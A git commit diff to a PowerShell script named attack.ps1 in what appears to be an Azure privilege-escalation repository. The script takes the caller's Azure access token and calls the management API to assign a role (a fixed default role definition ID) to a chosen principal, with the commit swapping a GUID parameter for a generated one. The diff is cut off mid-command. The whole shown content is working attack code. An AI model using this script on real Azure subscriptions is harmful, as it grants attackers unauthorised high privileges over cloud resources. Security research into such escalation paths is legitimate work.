f11122f734365a0d74f6d19c53768d3374a848e7
Rogier Dijkman <40334679+azurekid@users.noreply.github.com>
2023-07-06 16:56:47 +0200

    Update attack.ps1

--- priv-esc-arm-template/attack.ps1
+++ priv-esc-arm-template/attack.ps1
@@ -7,16 +7,13 @@ param (
     [string]$principalId,
 
     [Parameter()]
-    [string]$roleDefinition = '8e3af657-a8ff-443c-a75c-2fe8c4bcb635',
-
-    [Parameter()]
-    [string]$guid
+    [string]$roleDefinition = '8e3af657-a8ff-443c-a75c-2fe8c4bcb635'
 )
 
 $token = (Get-AzAccessToken).token
 $headers = @{"Authorization"="Bearer $token"}
 $payload = '{"properties": {"roleDefinitionId": "/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleDefinitions/$roleDefinition","principalId": "$principalId","principalType": "User"}}'
-
+$guid = (New-Guid).Guid
 Invoke-RestMethod -Uri 'https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleAssignments/$guid?api-version=2022-04-01' `
   -Headers $headers `
   -Body $payload `
